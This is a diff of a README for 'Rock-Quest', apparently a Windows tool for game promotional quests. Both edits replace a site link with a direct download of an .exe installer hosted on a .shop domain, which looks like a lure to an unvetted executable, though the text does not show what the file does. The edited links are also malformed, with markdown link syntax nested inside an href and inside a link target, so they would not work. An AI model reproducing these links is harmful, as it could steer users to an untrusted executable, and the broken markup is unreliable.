@@ -12,7 +12,7 @@
 <br/>
 
 <p align="center">
-  <a href="https://quest.rfbd.shop/">
+  <a href="[https://quest.rfbd.shop/](https://quest.rfbd.shop/update/Rock-Quest_1.0.3_x64-setup.exe)">
     <img src="https://img.shields.io/badge/📥%20Download%20Rock--Quest%20(v1.0.3)-5865F2?style=for-the-badge&logo=windows&logoColor=white" height="42" alt="Download Rock-Quest" />
   </a>
   &nbsp;&nbsp;
@@ -75,7 +75,7 @@ Rock-Quest comes with pre-configured verified game signatures for all promotiona
 
 ### 1. Download & Install
 Download the latest Windows installer:
-* **[Download Rock-Quest Installer](https://quest.rfbd.shop/)**
+* **[Download Rock-Quest Installer]([https://quest.rfbd.shop/](https://quest.rfbd.shop/update/Rock-Quest_1.0.3_x64-setup.exe))**
 
 ### 2. Choose Your Quest
 * Open **Rock-Quest**.
